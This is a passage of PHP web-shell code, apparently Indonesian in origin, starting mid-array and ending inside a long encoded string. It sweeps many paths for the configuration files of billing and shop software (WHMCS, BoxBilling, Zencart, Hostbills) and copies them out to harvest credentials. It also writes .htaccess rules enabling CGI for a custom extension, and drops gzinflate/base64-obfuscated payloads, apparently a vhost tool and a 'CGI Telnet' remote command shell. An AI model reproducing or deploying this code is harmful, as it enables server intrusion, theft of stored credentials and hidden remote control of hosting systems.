"$eca_user/My/submitticket.php" => "WHMCS", "$eca_user/my/submitticket.php" => "WHMCS", "$eca_user/secure/whm/submitticket.php" => "WHMCS", "$eca_user/secure/whmcs/submitticket.php" => "WHMCS", "$eca_user/panel/submitticket.php" => "WHMCS", "$eca_user/clientes/submitticket.php" => "WHMCS", "$eca_user/cliente/submitticket.php" => "WHMCS", "$eca_user/support/order/submitticket.php" => "WHMCS", "$eca_user/bb-config.php" => "BoxBilling", "$eca_user/boxbilling/bb-config.php" => "BoxBilling", "$eca_user/box/bb-config.php" => "BoxBilling", "$eca_user/host/bb-config.php" => "BoxBilling", "$eca_user/Host/bb-config.php" => "BoxBilling", "$eca_user/supportes/bb-config.php" => "BoxBilling", "$eca_user/support/bb-config.php" => "BoxBilling", "$eca_user/hosting/bb-config.php" => "BoxBilling", "$eca_user/cart/bb-config.php" => "BoxBilling", "$eca_user/order/bb-config.php" => "BoxBilling", "$eca_user/client/bb-config.php" => "BoxBilling", "$eca_user/clients/bb-config.php" => "BoxBilling", "$eca_user/cliente/bb-config.php" => "BoxBilling", "$eca_user/clientes/bb-config.php" => "BoxBilling", "$eca_user/billing/bb-config.php" => "BoxBilling", "$eca_user/billings/bb-config.php" => "BoxBilling", "$eca_user/my/bb-config.php" => "BoxBilling", "$eca_user/secure/bb-config.php" => "BoxBilling", "$eca_user/support/order/bb-config.php" => "BoxBilling", "$eca_user/includes/dist-configure.php" => "Zencart", "$eca_user/zencart/includes/dist-configure.php" => "Zencart", "$eca_user/products/includes/dist-configure.php" => "Zencart", "$eca_user/cart/includes/dist-configure.php" => "Zencart", "$eca_user/shop/includes/dist-configure.php" => "Zencart", "$eca_user/includes/iso4217.php" => "Hostbills", "$eca_user/hostbills/includes/iso4217.php" => "Hostbills", "$eca_user/host/includes/iso4217.php" => "Hostbills", "$eca_user/Host/includes/iso4217.php" => "Hostbills", "$eca_user/supportes/includes/iso4217.php" => "Hostbills", "$eca_user/support/includes/iso4217.php" => "Hostbills", "$eca_user/hosting/includes/iso4217.php" => "Hostbills", "$eca_user/cart/includes/iso4217.php" => "Hostbills", "$eca_user/order/includes/iso4217.php" => "Hostbills", "$eca_user/client/includes/iso4217.php" => "Hostbills", "$eca_user/clients/includes/iso4217.php" => "Hostbills", "$eca_user/cliente/includes/iso4217.php" => "Hostbills", "$eca_user/clientes/includes/iso4217.php" => "Hostbills", "$eca_user/billing/includes/iso4217.php" => "Hostbills", "$eca_user/billings/includes/iso4217.php" => "Hostbills", "$eca_user/my/includes/iso4217.php" => "Hostbills", "$eca_user/secure/includes/iso4217.php" => "Hostbills", "$eca_user/support/order/includes/iso4217.php" => "Hostbills"];
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("eca_config/$user_config_dir-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	print "<div style='background: #6d6d6d; width: 100%; height: 100%'>";
	print "<iframe src='".$current_path."eca_config/' frameborder='0' scrolling='yes'></iframe>";
	print "</div>";
}
elseif($_GET['config'] == 'vhosts') {
mkdir('eca_vhosts_conf', 0755);
        chdir('eca_vhosts_conf');
        $vh_nya = "vhosts.eca";
        $ht_nya = ".htaccess";
        $isi_ht = "OPTIONS Indexes Includes ExecCGI FollowSymLinks
AddType application/x-httpd-cgi .eca
AddHandler cgi-script .eca
AddHandler cgi-script .eca";
        $ht_v = fopen(".htaccess", "w");
        $isi_vh ="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";
	$vhosts = fopen($vh_nya, "w");
	fwrite($vhosts, gzinflate(base64_decode($isi_vh)));
	fwrite($ht_v, $isi_ht);
	chmod($vh_nya, 0755);
        chmod($ht_nya, 0755);
	echo "<br><br><center><div class='fitur'><a href='eca_vhosts_conf/vhosts.eca' target='_blank'>Click Here</a></div></center>";
} 
}
// CGI Telnet
elseif(isset($_GET['cgi'])) {
$cgi_dir = mkdir('eca_cgi', 0755);
        chdir('eca_cgi');
	$file_cgi = "cgi.eca";
        $pekok = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks
AddType application/x-httpd-cgi .eca
AddHandler cgi-script .eca
AddHandler cgi-script .eca";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = "
	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